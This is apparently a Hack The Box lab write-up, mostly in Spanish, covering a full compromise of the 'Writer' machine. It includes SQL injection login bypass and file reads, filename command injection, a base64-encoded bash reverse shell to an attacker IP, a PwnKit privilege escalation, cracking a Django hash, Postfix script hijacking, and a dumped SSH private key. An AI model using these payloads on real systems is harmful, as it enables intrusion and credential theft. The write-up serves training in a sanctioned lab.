---
layout: single
title: Writer - Hack The Box
excerpt: "Writer is a medium Linux machine that outlines poor coding practices and presents how a file read vulnerability through SQL injection can lead to disclosure of source code files which include credentials. The combination of password reuse on the SMB service with a blind SSRF exploitation via an image upload function can lead to a foothold on the system. By abusing Django features it is possible to extract and crack user credentials. Further abusing multiple misconfigurations in Postfix service leads to exploit privileges in the apt service folders allowing those users to execute commands as root through a script that updates the machine every minute."
date: 2025-06-27
classes: wide
header:
  teaser: /img2/writer.png
  teaser_home_page: true
  icon: /img2/images/hackthebox.webp
categories:
  - hackthebox
  - Linux
  - Medium
tags:
  - SQLi Bypass Login + SQL Injection [Database Enumeration]
  - SQLi - File System Enumeration (Abusing load_file)
  - Python Code Analysis
  - Command Injection
  - Cracking Hashes
  - Postfix Enumeration
  - Abusing Cron Job [User Pivoting]
  - SUID Binary Exploitation [Privilege Escalation] (OPTION 1)
  - Abusing apt config files [Privilege Escalation] (OPTION 2)
---


## Reconnaissance

- Nmap

```bash
❯ nmap -sS --open -p- --min-rate 5000 -n -Pn 10.10.11.101
```

```ruby
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-27 13:29 CEST
Nmap scan report for 10.10.11.101
Host is up (0.072s latency).
Not shown: 64269 closed tcp ports (reset), 1262 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 16.15 seconds
```

- Vulnerability and version scan

```bash
❯ nmap -sCV -p22,80,139,445 10.10.11.101
```

```ruby
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-27 13:30 CEST
Nmap scan report for 10.10.11.101
Host is up (0.059s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 98:20:b9:d0:52:1f:4e:10:3a:4a:93:7e:50:bc:b8:7d (RSA)
|   256 10:04:79:7a:29:74:db:28:f9:ff:af:68:df:f1:3f:34 (ECDSA)
|_  256 77:c4:86:9a:9f:33:4f:da:71:20:2c:e1:51:10:7e:8d (ED25519)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Story Bank | Writer.HTB
|_http-server-header: Apache/2.4.41 (Ubuntu)
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2025-06-27T11:30:56
|_  start_date: N/A
|_nbstat: NetBIOS name: WRITER, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.65 seconds
```

- Add domain to /etc/hosts

```bash
❯ echo "10.10.11.101 writer.htb" >> /etc/hosts
```

- Gobuster

```bash
❯ gobuster dir -u http://writer.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50
```

```ruby
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://writer.htb/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/about                (Status: 200) [Size: 3522]
/contact              (Status: 200) [Size: 4905]
/static               (Status: 301) [Size: 309] [--> http://writer.htb/static/]
/logout               (Status: 302) [Size: 208] [--> http://writer.htb/]
/dashboard            (Status: 302) [Size: 208] [--> http://writer.htb/]
/administrative       (Status: 200) [Size: 1443]
/server-status        (Status: 403) [Size: 275]
```

## Exploitation

- SQL Injection in login panel

![](/img2/Pasted%20image%2020250627135704.png)

> En la supuesta query original, la injección quedaría tal que así:

```sql
select * from users where username='admin'or 1=1-- -' and password='admin'
```

- Get all columns 

![](/img2/Pasted%20image%2020250627195907.png)

> Existen 6 columnas en la tabla actual.

![](/img2/Pasted%20image%2020250627200047.png)

> Vemos que tenemos el control del output en la segunda columna (user).

- Read Files

![](/img2/Pasted%20image%2020250627200435.png)

> Con la función LOAD_FILE() podemos leer archivos internos del sistema, sabiendo esto podemos apuntar hacia el archivo de configuración por defecto de apache2.

![](/img2/Pasted%20image%2020250627233025.png)

> Dentro del archivo de configuración por defecto encontramos un archivo sospechoso.

![](/img2/Pasted%20image%2020250627233141.png)

> Encontramos un archivo python el cual importa una librería personalizada, teniendo en cuenta esto, podemos apuntar hacia el archivo 'init.py' dentro de la carpeta writer.

![](/img2/Pasted%20image%2020250627233402.png)

> Pasamos el archivo python a limpio.

```python
from flask import Flask, session, redirect, url_for, request, render_template
from mysql.connector import errorcode
import mysql.connector
import urllib.request
import os
import PIL
from PIL import Image, UnidentifiedImageError
import hashlib

app = Flask(__name__, static_url_path='', static_folder='static', template_folder='templates')

# Define connection for database
def connections():
    try:
        connector = mysql.connector.connect(
            user='admin',
            password='ToughPasswordToCrack',
            host='127.0.0.1',
            database='writer'
        )
        return connector
    except mysql.connector.Error as err:
        if err.errno == errorcode.ER_ACCESS_DENIED_ERROR:
            return "Something is wrong with your db user name or password!"
        elif err.errno == errorcode.ER_BAD_DB_ERROR:
            return "Database does not exist"
        else:
            return "Another exception, returning!"
    else:
        print('Connection to DB is ready!')

# Define homepage
@app.route('/')
def home_page():
    try:
        connector = connections()
    except mysql.connector.Error as err:
        return "Database error"
    cursor = connector.cursor()
    sql_command = "SELECT * FROM stories;"
    cursor.execute(sql_command)
    results = cursor.fetchall()
    return render_template('blog/blog.html', results=results)

# Define about page
@app.route('/about')
def about():
    return render_template('blog/about.html')

# Define contact page
@app.route('/contact')
def contact():
    return render_template('blog/contact.html')

# Define blog posts
@app.route('/blog/post/<id>', methods=['GET'])
def blog_post(id):
    try:
        connector = connections()
    except mysql.connector.Error as err:
        return "Database error"
    cursor = connector.cursor()
    cursor.execute("SELECT * FROM stories WHERE id = %(id)s;", {'id': id})
    results = cursor.fetchall()
    sql_command = "SELECT * FROM stories;"
    cursor.execute(sql_command)
    stories = cursor.fetchall()
    return render_template('blog/blog-single.html', results=results, stories=stories)

# Define dashboard for authenticated users
@app.route('/dashboard')
def dashboard():
    if not ('user' in session):
        return redirect('/')
    return render_template('dashboard.html')

# Define stories page for dashboard and edit/delete pages
@app.route('/dashboard/stories')
def stories():
    if not ('user' in session):
        return redirect('/')
    try:
        connector = connections()
    except mysql.connector.Error as err:
        return "Database error"
    cursor = connector.cursor()
    sql_command = "Select * From stories;"
    cursor.execute(sql_command)
    results = cursor.fetchall()
    return render_template('stories.html', results=results)

@app.route('/dashboard/stories/add', methods=['GET', 'POST'])
def add_story():
    if not ('user' in session):
        return redirect('/')
    try:
        connector = connections()
    except mysql.connector.Error as err:
        return "Database error"
    if request.method == "POST":
        if request.files['image']:
            image = request.files['image']
            if ".jpg" in image.filename:
                path = os.path.join('/var/www/writer.htb/writer/static/img/', image.filename)
                image.save(path)
                image = "/img/{}".format(image.filename)
            else:
                error = "File extensions must be in .jpg!"
                return render_template('add.html', error=error)

        if request.form.get('image_url'):
            image_url = request.form.get('image_url')
            if ".jpg" in image_url:
                try:
                    local_filename, headers = urllib.request.urlretrieve(image_url)
                    os.system("mv {} {}.jpg".format(local_filename, local_filename))
                    image = "{}.jpg".format(local_filename)
                    try:
                        im = Image.open(image)
                        im.verify()
                        im.close()
                        image = image.replace('/tmp/', '')
                        os.system("mv /tmp/{} /var/www/writer.htb/writer/static/img/{}".format(image, image))
                        image = "/img/{}".format(image)
                    except PIL.UnidentifiedImageError:
                        os.system("rm {}".format(image))
                        error = "Not a valid image file!"
                        return render_template('add.html', error=error)
                except:
                    error = "Issue uploading picture"
                    return render_template('add.html', error=error)
            else:
                error = "File extensions must be in .jpg!"
                return render_template('add.html', error=error)

        author = request.form.get('author')
        title = request.form.get('title')
        tagline = request.form.get('tagline')
        content = request.form.get('content')
        cursor = connector.cursor()
        cursor.execute("INSERT INTO stories VALUES (NULL,%(author)s,%(title)s,%(tagline)s,%(content)s,'Published',now(),%(image)s);", {
            'author': author,
            'title': title,
            'tagline': tagline,
            'content': content,
            'image': image
        })
        connector.commit()
        return redirect('/dashboard/stories')
    else:
        return render_template('add.html')

@app.route('/dashboard/stories/edit/<id>', methods=['GET', 'POST'])
def edit_story(id):
    if not ('user' in session):
        return redirect('/')
    try:
        connector = connections()
    except mysql.connector.Error as err:
        return "Database error"
    if request.method == "POST":
        cursor = connector.cursor()
        cursor.execute("SELECT * FROM stories where id = %(id)s;", {'id': id})
        results = cursor.fetchall()
        if request.files['image']:
            image = request.files['image']
            if ".jpg" in image.filename:
                path = os.path.join('/var/www/writer.htb/writer/static/img/', image.filename)
                image.save(path)
                image = "/img/{}".format(image.filename)
                cursor.execute("UPDATE stories SET image = %(image)s WHERE id = %(id)s", {'image': image, 'id': id})
                connector.commit()
            else:
                error = "File extensions must be in .jpg!"
                return render_template('edit.html', error=error, results=results, id=id)
        if request.form.get('image_url'):
            image_url = request.form.get('image_url')
            if ".jpg" in image_url:
                try:
                    local_filename, headers = urllib.request.urlretrieve(image_url)
                    os.system("mv {} {}.jpg".format(local_filename, local_filename))
                    image = "{}.jpg".format(local_filename)
                    try:
                        im = Image.open(image)
                        im.verify()
                        im.close()
                        image = image.replace('/tmp/', '')
                        os.system("mv /tmp/{} /var/www/writer.htb/writer/static/img/{}".format(image, image))
                        image = "/img/{}".format(image)
                        cursor.execute("UPDATE stories SET image = %(image)s WHERE id = %(id)s", {'image': image, 'id': id})
                        connector.commit()
                    except PIL.UnidentifiedImageError:
                        os.system("rm {}".format(image))
                        error = "Not a valid image file!"
                        return render_template('edit.html', error=error, results=results, id=id)
                except:
                    error = "Issue uploading picture"
                    return render_template('edit.html', error=error, results=results, id=id)
            else:
                error = "File extensions must be in .jpg!"
                return render_template('edit.html', error=error, results=results, id=id)

        title = request.form.get('title')
        tagline = request.form.get('tagline')
        content = request.form.get('content')
        cursor.execute("UPDATE stories SET title = %(title)s, tagline = %(tagline)s, content = %(content)s WHERE id = %(id)s", {
            'title': title,
            'tagline': tagline,
            'content': content,
            'id': id
        })
        connector.commit()
        return redirect('/dashboard/stories')
    else:
        cursor = connector.cursor()
        cursor.execute("SELECT * FROM stories where id = %(id)s;", {'id': id})
        results = cursor.fetchall()
        return render_template('edit.html', results=results, id=id)

@app.route('/dashboard/stories/delete/<id>', methods=['GET', 'POST'])
def delete_story(id):
    if not ('user' in session):
        return redirect('/')
    try:
        connector = connections()
    except mysql.connector.Error as err:
        return "Database error"
    if request.method == "POST":
        cursor = connector.cursor()
        cursor.execute("DELETE FROM stories WHERE id = %(id)s;", {'id': id})
        connector.commit()
        return redirect('/dashboard/stories')
    else:
        cursor = connector.cursor()
        cursor.execute("SELECT * FROM stories where id = %(id)s;", {'id': id})
        results = cursor.fetchall()
        return render_template('delete.html', results=results, id=id)

# Define user page for dashboard
@app.route('/dashboard/users')
def users():
    if not ('user' in session):
        return redirect('/')
    try:
        connector = connections()
    except mysql.connector.Error as err:
        return "Database Error"
    cursor = connector.cursor()
    sql_command = "SELECT * FROM users;"
    cursor.execute(sql_command)
    results = cursor.fetchall()
    return render_template('users.html', results=results)

# Define settings page
@app.route('/dashboard/settings', methods=['GET'])
def settings():
    if not ('user' in session):
        return redirect('/')
    try:
        connector = connections()
    except mysql.connector.Error as err:
        return "Database Error!"
    cursor = connector.cursor()
    sql_command = "SELECT * FROM site WHERE id = 1"
    cursor.execute(sql_command)
    results = cursor.fetchall()
    return render_template('settings.html', results=results)

# Define authentication mechanism
@app.route('/administrative', methods=['POST', 'GET'])
def login_page():
    if 'user' in session:
        return redirect('/dashboard')
    if request.method == "POST":
        username = request.form.get('uname')
        password = request.form.get('password')
        password = hashlib.md5(password.encode('utf-8')).hexdigest()
        try:
            connector = connections()
        except mysql.connector.Error as err:
            return "Database error"
        try:
            cursor = connector.cursor()
            sql_command = "Select * From users Where username = '%s' And password = '%s'" % (username, password)
            cursor.execute(sql_command)
            results = cursor.fetchall()
            for result in results:
                print("Got result")
            if result and len(result) != 0:
                session['user'] = username
                return render_template('success.html', results=results)
            else:
                error = "Incorrect credentials supplied"
                return render_template('login.html', error=error)
        except:
            error = "Incorrect credentials supplied"
            return render_template('login.html', error=error)
    else:
        return render_template('login.html')

@app.route("/logout")
def logout():
    if not ('user' in session):
        return redirect('/')
    session.pop('user')
    return redirect('/')

if __name__ == '__main__':
    app.run("0.0.0.0")

```

> Analizando el código vemos una función sospechosa:

```python
        if request.form.get('image_url'):
            image_url = request.form.get('image_url')
            if ".jpg" in image_url:
                try:
                    local_filename, headers = urllib.request.urlretrieve(image_url)
                    os.system("mv {} {}.jpg".format(local_filename, local_filename))
                    image = "{}.jpg".format(local_filename)
                    try:
                        im = Image.open(image)
                        im.verify()
                        im.close()
                        image = image.replace('/tmp/', '')
                        os.system("mv /tmp/{} /var/www/writer.htb/writer/static/img/{}".format(image, image))
                        image = "/img/{}".format(image)
                        cursor.execute("UPDATE stories SET image = %(image)s WHERE id = %(id)s", {'image': image, 'id': id})
                        connector.commit()
                    except PIL.UnidentifiedImageError:
                        os.system("rm {}".format(image))
                        error = "Not a valid image file!"
                        return render_template('edit.html', error=error, results=results, id=id)
                except:
                    error = "Issue uploading picture"
                    return render_template('edit.html', error=error, results=results, id=id)
            else:
                error = "File extensions must be in .jpg!"
                return render_template('edit.html', error=error, results=results, id=id)
```

- Remote Code Execution (Explicación)

```bash
❯ python3 
```

```python
Python 3.13.2 (main, Mar 13 2025, 14:29:07) [GCC 14.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import urllib.request
>>> local_filename, headers = urllib.request.urlretrieve("file:///etc/passwd")
>>> print(local_filename)
/etc/passwd
```

> Teniendo en cuenta la función anterior vemos que extrae el archivo de la url proporcionada para después ejecutar un comando con la librería os. Para poder ejecutar comandos podemos aprovecharnos del wrapper file:// para leer archivos del sistema. Sabiendo esto, necesitamos subir un archivo a la máquina víctima con un nombre malicioso, por ejemplo: 

```
test.jpg;ping -c1 10.10.14.4;
```

> El comando que se ejecutará por detrás al proporcionar este archivo como url será el siguiente:

```bash
mv test.jpg;ping -c1 10.10.14.4; test.jpg;ping -c1 10.10.14.4;jpg" 
```

> De esta forma estaremos inyectando un comando en la máquina víctima.

- Remote Code Execution (Explotación)

```bash
❯ touch 'test.jpg;ping -c1 10.10.14.4;'
```

![](/img2/Pasted%20image%2020250627234652.png)

![](/img2/Pasted%20image%2020250627235138.png)

```bash
❯ tcpdump -i tun0 icmp
```

```ruby
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
23:51:05.675328 IP writer.htb > 10.10.14.4: ICMP echo request, id 7, seq 1, length 64
23:51:05.675373 IP 10.10.14.4 > writer.htb: ICMP echo reply, id 7, seq 1, length 64
23:51:05.751030 IP writer.htb > 10.10.14.4: ICMP echo request, id 8, seq 1, length 64
23:51:05.751070 IP 10.10.14.4 > writer.htb: ICMP echo reply, id 8, seq 1, length 64
```

- Reverse Shell

```bash
❯ touch 'exploit.jpg;echo "YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzkwMDAgMD4mMScK"|base64 -d |bash;'
```

![](/img2/Pasted%20image%2020250627234652.png)

![](/img2/Pasted%20image%2020250628003055.png)

```bash
❯ nc -nlvp 9000 
```

```ruby
listening on [any] 9000 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.11.101] 53140
bash: cannot set terminal process group (1054): Inappropriate ioctl for device
bash: no job control in this shell
www-data@writer:/$ 
```

## Post-exploitation (OPTION 1)

-  Find SUID

```bash
www-data@writer:/tmp$ find / -perm -4000 2>/dev/null
```

```ruby
/snap/snapd/12704/usr/lib/snapd/snap-confine
/snap/snapd/12398/usr/lib/snapd/snap-confine
/snap/core18/2066/bin/mount
/snap/core18/2066/bin/ping
/snap/core18/2066/bin/su
/snap/core18/2066/bin/umount
/snap/core18/2066/usr/bin/chfn
/snap/core18/2066/usr/bin/chsh
/snap/core18/2066/usr/bin/gpasswd
/snap/core18/2066/usr/bin/newgrp
/snap/core18/2066/usr/bin/passwd
/snap/core18/2066/usr/bin/sudo
/snap/core18/2066/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/2066/usr/lib/openssh/ssh-keysign
/snap/core18/2074/bin/mount
/snap/core18/2074/bin/ping
/snap/core18/2074/bin/su
/snap/core18/2074/bin/umount
/snap/core18/2074/usr/bin/chfn
/snap/core18/2074/usr/bin/chsh
/snap/core18/2074/usr/bin/gpasswd
/snap/core18/2074/usr/bin/newgrp
/snap/core18/2074/usr/bin/passwd
/snap/core18/2074/usr/bin/sudo
/snap/core18/2074/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/2074/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/at
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/umount
/usr/bin/chsh
/usr/bin/fusermount
```


- CVE-2021-4034 (Pkexec Local Privilege Escalation)

```bash
wget https://github.com/ly4k/PwnKit/blob/main/PwnKit.c
python3 -m http.server
```

```bash
wget http://10.10.16.7/PwnKit.c
gcc -shared PwnKit.c -o PwnKit -Wl,-e,entry -fPIC
./PwnKit
```

## Post-exploitation (OPTION 2)

- Information Leakage

```bash
www-data@writer:/tmp$ cat /etc/mysql/mariadb.cnf    
```

```ruby
# The MariaDB configuration file
#
# The MariaDB/MySQL tools read configuration files in the following order:
# 1. "/etc/mysql/mariadb.cnf" (this file) to set global defaults,
# 2. "/etc/mysql/conf.d/*.cnf" to set global options.
# 3. "/etc/mysql/mariadb.conf.d/*.cnf" to set MariaDB-only options.
# 4. "~/.my.cnf" to set user-specific options.
#
# If the same option is defined multiple times, the last one will apply.
#
# One can use all long options that the program supports.
# Run program with --help to get a list of available options and with
# --print-defaults to see which it would actually understand and use.

#
# This group is read both both by the client and the server
# use it for options that affect everything
#
[client-server]

# Import all .cnf files from configuration directory
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mariadb.conf.d/

[client]
database = dev
user = djangouser
password = DjangoSuperPassword
default-character-set = utf8
```

> Credenciales: djangouser:DjangoSuperPassword

- Cracking django hash

```bash
www-data@writer:/tmp$ mysql -u djangouser
```

```ruby
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 90
Server version: 10.3.29-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [dev]> show tables;
+----------------------------+
| Tables_in_dev              |
+----------------------------+
| auth_group                 |
| auth_group_permissions     |
| auth_permission            |
| auth_user                  |
| auth_user_groups           |
| auth_user_user_permissions |
| django_admin_log           |
| django_content_type        |
| django_migrations          |
| django_session             |
+----------------------------+
10 rows in set (0.000 sec)

MariaDB [dev]> select * from auth_user;
+----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+
| id | password                                                                                 | last_login | is_superuser | username | first_name | last_name | email           | is_staff | is_active | date_joined                |
+----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+
|  1 | pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A= | NULL       |            1 | kyle     |            |           | kyle@writer.htb |        1 |         1 | 2021-05-19 12:41:37.168368 |
+----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+
1 row in set (0.000 sec)
```

```bash
❯ hashid hash
```

```ruby
--File 'hash'--
Analyzing 'pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A='
[+] Django(PBKDF2-HMAC-SHA256) 
--End of file 'hash'--   
```

> Se trata de un hash Django(PBKDF2-HMAC-SHA256) 

```bash
❯ hashcat --example-hashes | grep -i "Django" -C 3
```

```ruby
  Plaintext.Encoding..: ASCII, HEX

Hash mode #124
  Name................: Django (SHA-1)
  Category............: Framework
  Slow.Hash...........: No
  Password.Len.Min....: 0
--
  Plaintext.Encoding..: ASCII, HEX

Hash mode #10000
  Name................: Django (PBKDF2-SHA256)
  Category............: Framework
  Slow.Hash...........: Yes
  Password.Len.Min....: 0
```

> Sabiendo el hash mode, ya podemos crackearlo.

```bash
❯ hashcat -m 10000 hash /usr/share/wordlists/rockyou.txt 
```

```ruby
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #1: cpu-haswell-AMD Ryzen 5 5600X 6-Core Processor, 6924/13913 MB (2048 MB allocatable), 6MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt
* Slow-Hash-SIMD-LOOP

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Cracking performance lower than expected?                 

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A=:marcoantonio
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 10000 (Django (PBKDF2-SHA256))
Hash.Target......: pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8...uXM4A=
Time.Started.....: Sat Jun 28 12:08:55 2025 (45 secs)
Time.Estimated...: Sat Jun 28 12:09:40 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      272 H/s (9.96ms) @ Accel:512 Loops:256 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 12288/14344385 (0.09%)
Rejected.........: 0/12288 (0.00%)
Restore.Point....: 9216/14344385 (0.06%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:259840-259999
Candidate.Engine.: Device Generator
Candidates.#1....: rubberducky -> hawkeye
Hardware.Mon.#1..: Util: 90%

Started: Sat Jun 28 12:08:51 2025
Stopped: Sat Jun 28 12:09:41 2025
```

> Contraseña: marcoantonio.

- Pivoting

```bash
www-data@writer:/tmp$ su kyle
```

```ruby
Password: 
kyle@writer:/tmp$ 
```

- List groups

```bash
kyle@writer:/tmp$ id
```

```ruby
uid=1000(kyle) gid=1000(kyle) groups=1000(kyle),997(filter),1002(smbgroup)
```

```bash
kyle@writer:/tmp$ find / -group filter 2>/dev/null
```

```ruby
/etc/postfix/disclaimer
/var/spool/filter
```

- List crontab new commands

```bash
kyle@writer:/tmp$ ./procmon.sh 
````

```ruby
[+] Listing new commands...

```ruby
< root     /usr/sbin/CRON -f
< root     /bin/sh -c /usr/bin/cp /root/.scripts/master.cf /etc/postfix/master.cf
< root     /bin/sh -c /usr/bin/cp /root/.scripts/disclaimer /etc/postfix/disclaimer
< root     /bin/sh -c /usr/bin/find /etc/apt/apt.conf.d/ -mtime -1 -exec rm {} \;
> root     /bin/sh -c /usr/bin/apt-get update
> root     /bin/sh -c /usr/bin/cp -r /root/.scripts/writer2_project /var/www/
> root     /usr/bin/cp -r /root/.scripts/writer2_project /var/www/
```

> Vemos que el usuario root hace dos copias de seguridad para dos archivos del directorio /etc/postfix.

```bash
kyle@writer:/tmp$ cat /etc/postfix/master.cf
```

```ruby
.....
uucp      unix  -       n       n       -       -       pipe
  flags=Fqhu user=uucp argv=uux -r -n -z -a$sender - $nexthop!rmail ($recipient)
#
# Other external delivery methods.
#
ifmail    unix  -       n       n       -       -       pipe
  flags=F user=ftn argv=/usr/lib/ifmail/ifmail -r $nexthop ($recipient)
bsmtp     unix  -       n       n       -       -       pipe
  flags=Fq. user=bsmtp argv=/usr/lib/bsmtp/bsmtp -t$nexthop -f$sender $recipient
scalemail-backend unix	-	n	n	-	2	pipe
  flags=R user=scalemail argv=/usr/lib/scalemail/bin/scalemail-store ${nexthop} ${user} ${extension}
mailman   unix  -       n       n       -       -       pipe
  flags=FR user=list argv=/usr/lib/mailman/bin/postfix-to-mailman.py
  ${nexthop} ${user}
dfilt     unix  -       n       n       -       -       pipe
  flags=Rq user=john argv=/etc/postfix/disclaimer -f ${sender} -- ${recipient}
```

> Vemos que el usuario john ejecuta el script /etc/postfix/disclaimer cada vez que manda un correo.

```bash
kyle@writer:/tmp$ cat /etc/postfix/disclaimer_addresses 
```

```ruby
root@writer.htb
kyle@writer.htb
```

> Vemos los correos a los que podemos enviar mensajes.

- Send reverse shell

```python
import smtplib

smtp_server = "127.0.0.1"
port = 25
receiver_email="kyle@writer.htb"
sender_email = "kyle@writer.htb"
message="Test"


try:
    with smtplib.SMTP(smtp_server, port, timeout=10) as server:
        server.sendmail(sender_email, receiver_email, message)
        print("Correo enviado correctamente.")
except Exception as e:
    print(f"Error al enviar el correo: {e}")
```

> Creamos el script en python para mandar un correo a kyle@writer.htb, si todo funciona correctamente el usuario john debería de ejecutar el script /etc/postfix/disclaimer al mandar el correo, por eso podemos modificar el script y mandarnos una reverse shell.

```bash
nano /etc/postfix/disclaimer
```

![](/img2/Pasted%20image%2020250628131946.png)

```bash
❯ nc -nlvp 9000 
```

```ruby
listening on [any] 9000 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.11.101] 47546
bash: cannot set terminal process group (673621): Inappropriate ioctl for device
bash: no job control in this shell
john@writer:/var/spool/postfix
```

- Connect ssh with private key

```bash
john@writer:/home/john/.ssh$ cat id_rsa
```

```ruby
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAxqOWLbG36VBpFEz2ENaw0DfwMRLJdD3QpaIApp27SvktsWY3hOJz
wC4+LHoqnJpIdi/qLDnTx5v8vB67K04f+4FJl2fYVSwwMIrfc/+CHxcTrrw+uIRVIiUuKF
OznaG7QbqiFE1CsmnNAf7mz4Ci5VfkjwfZr18rduaUXBdNVIzPwNnL48wzF1QHgVnRTCB3
i76pHSoZEA0bMDkUcqWuI0Z+3VOZlhGp0/v2jr2JH/uA6U0g4Ym8vqgwvEeTk1gNPIM6fg
9xEYMUw+GhXQ5Q3CPPAVUaAfRDSivWtzNF1XcELH1ofF+ZY44vcQppovWgyOaw2fAHW6ea
TIcfhw3ExT2VSh7qm39NITKkAHwoPQ7VJbTY0Uj87+j6RV7xQJZqOG0ASxd4Y1PvKiGhke
tFOd6a2m8cpJwsLFGQNtGA4kisG8m//aQsZfllYPI4n4A1pXi/7NA0E4cxNH+xt//ZMRws
sfahK65k6+Yc91qFWl5R3Zw9wUZl/G10irJuYXUDAAAFiN5gLYDeYC2AAAAAB3NzaC1yc2
EAAAGBAMajli2xt+lQaRRM9hDWsNA38DESyXQ90KWiAKadu0r5LbFmN4Tic8AuPix6Kpya
SHYv6iw508eb/LweuytOH/uBSZdn2FUsMDCK33P/gh8XE668PriEVSIlLihTs52hu0G6oh
RNQrJpzQH+5s+AouVX5I8H2a9fK3bmlFwXTVSMz8DZy+PMMxdUB4FZ0Uwgd4u+qR0qGRAN
GzA5FHKlriNGft1TmZYRqdP79o69iR/7gOlNIOGJvL6oMLxHk5NYDTyDOn4PcRGDFMPhoV
0OUNwjzwFVGgH0Q0or1rczRdV3BCx9aHxfmWOOL3EKaaL1oMjmsNnwB1unmkyHH4cNxMU9
lUoe6pt/TSEypAB8KD0O1SW02NFI/O/o+kVe8UCWajhtAEsXeGNT7yohoZHrRTnemtpvHK
ScLCxRkDbRgOJIrBvJv/2kLGX5ZWDyOJ+ANaV4v+zQNBOHMTR/sbf/2TEcLLH2oSuuZOvm
HPdahVpeUd2cPcFGZfxtdIqybmF1AwAAAAMBAAEAAAGAZMExObg9SvDoe82VunDLerIE+T
